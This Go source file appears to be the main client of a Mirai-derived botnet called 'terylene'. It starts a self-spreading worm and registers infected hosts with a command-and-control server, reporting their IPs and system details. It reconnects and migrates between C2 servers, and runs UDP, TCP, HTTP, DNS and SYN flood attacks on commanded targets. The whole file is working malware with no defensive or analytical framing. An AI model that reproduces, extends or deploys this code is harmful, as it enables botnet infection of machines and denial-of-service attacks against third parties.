package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	config "terylene/config"
	system "terylene/mirai/components/system"
	"terylene/mirai/components/worm"
	attack "terylene/mirai/ddos"
	"time"

	zmq "github.com/pebbe/zmq4"
)

func getFreshSocket(olddealer, oldsubscriber *zmq.Socket) (newdealer, newsubscriber *zmq.Socket) {
	olddealer.Close()
	oldsubscriber.Close()
	nsubscriber, _ := zmq.NewSocket(zmq.SUB)
	nsubscriber.SetLinger(0)
	ndealer, _ := zmq.NewSocket(zmq.DEALER)
	ndealer.SetLinger(0)
	return ndealer, nsubscriber
}
func migration(dealer, subscriber *zmq.Socket, C2ip, rport string) {
	//migration called
	ndealer, nsubscriber := getFreshSocket(dealer, subscriber)
	err := register(ndealer, nsubscriber, C2ip, rport, time.Second*10)
	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
		//migration failed, returning to mother
		ndealer.Close()
		nsubscriber.Close()
		returntomother()
	} else {
		os.Exit(1)
	}
}

func reconnect(dealer, subscriber *zmq.Socket, C2ip, rport string, signal <-chan struct{}) {
	<-signal
	ndealer, nsubscriber := getFreshSocket(dealer, subscriber)
	// sleep for 30min before reconnecting
	time.Sleep(time.Minute * 30)
	err := register(ndealer, nsubscriber, C2ip, rport, time.Hour*4)
	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
		//reconnection timed out , returning to mother
		ndealer.Close()
		nsubscriber.Close()
		returntomother()
	} else {
		os.Exit(1)
	}
}

func returntomother() {
	nsubscriber, _ := zmq.NewSocket(zmq.SUB)
	nsubscriber.SetLinger(0)
	ndealer, _ := zmq.NewSocket(zmq.DEALER)
	ndealer.SetLinger(0)

	err := register(ndealer, nsubscriber, config.C2ip, config.Broadcastport, time.Hour*720)
	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
		//Mother is DEAD
		ndealer.Close()
		nsubscriber.Close()
		//Kill itself
		os.Exit(1)
	} else {
		//kill itself anyways
		os.Exit(1)
	}
}

func dealerhandle(dealer, subscriber *zmq.Socket, signal chan<- struct{}) {
	for {
		dealer.SetRcvtimeo(time.Second * 10)
		res, err := dealer.RecvMessage(0)
		if err != nil {

			signal <- struct{}{}
			break
		}

		if res[0] == "h" {
			dealer.SendMessage("h")
		}

		if len(res) == 3 {
			if res[0] == "migrate" {
				migration(dealer, subscriber, res[1], res[2])
			}
		}
	}
}

func register(dealer, subscriber *zmq.Socket, C2ip, rport string, timeout time.Duration) error {

	err := dealer.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, rport))

	if err != nil {
		return err
	}
	localip, err := system.GETIPDNS()
	if err != nil {
		return err
	}
	arch, OS, pubip := system.GETSYSTEM()

	connId := system.GenerateConnID(localip, pubip)

	_, err = dealer.SendMessage("reg", arch, OS, localip, pubip, connId)

	if err != nil {
		return err
	}

	dealer.SetRcvtimeo(timeout)

	res, err := dealer.RecvMessage(0)
	if err != nil {
		return err
	}
	if res[0] == "terylene" {
		signal := make(chan struct{})
		go dealerhandle(dealer, subscriber, signal)
		go reconnect(dealer, subscriber, C2ip, rport, signal)
		terylene(subscriber, C2ip, res[0], res[1])
	} else if res[0] == "kys" {
		for i := 1; i < 4; i++ {
			_, err := dealer.SendMessage("reg", arch, OS, localip, pubip, connId)
			if err != nil {
				break
			}
			res, err := dealer.RecvMessage(0)
			if err != nil {
				break
			}

			if res[0] == "kys" {
				time.Sleep(time.Second * 2)
			} else if res[0] == "terylene" {
				signal := make(chan struct{})
				go dealerhandle(dealer, subscriber, signal)
				go reconnect(dealer, subscriber, C2ip, rport, signal)
				terylene(subscriber, C2ip, res[0], res[1])
			} else {
				time.Sleep(time.Second * 2)
			}
		}
	}
	return err
}

func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
	defer subscriber.Close()
	subscriber.SetSubscribe(bot)
	for {
		message, _ := subscriber.Recv(0)
		go func(message string) {
			parts := strings.Split(message, ":")
			message = parts[1]
			if strings.Contains(message, "!") {
				for _, value := range config.Methods {
					if strings.Contains(message, value) {
						parts := strings.Fields(message)
						if len(parts) == 4 {
							method := strings.TrimPrefix(parts[0], "!")
							target := parts[1]
							port, err := strconv.Atoi(parts[2])
							if err != nil {
								continue
							}
							duration, err := strconv.Atoi(parts[3])
							if err != nil {
								continue
							}
							switch method {
							case "UDP":
								for i := 1; i < 5; i++ {
									go attack.UDP(target, port, duration)
								}
							case "TCP":
								for i := 1; i < 5; i++ {
									go attack.TCP(target, port, duration)
								}
							case "HTTP":
								for i := 1; i < 5; i++ {
									go attack.HTTP(target, duration)
								}
							case "DNS":
								for i := 1; i < 5; i++ {
									go attack.DNS(target, duration)
								}
							case "SYN":
								for i := 1; i < 5; i++ {
									go attack.SYN(target, port, duration)
								}
							case "UDP-VIP":
								for i := 1; i < 5; i++ {
									go attack.UDP_VIP(target, port, duration)
								}
							}
						}
					}
				}
			}
		}(message)
	}
}
func main() {
	go worm.Startworm()
	subscriber, _ := zmq.NewSocket(zmq.SUB)
	subscriber.SetLinger(0)
	dealer, _ := zmq.NewSocket(zmq.DEALER)
	dealer.SetLinger(0)
	register(dealer, subscriber, config.C2ip, config.Routerport, time.Second*5)
}
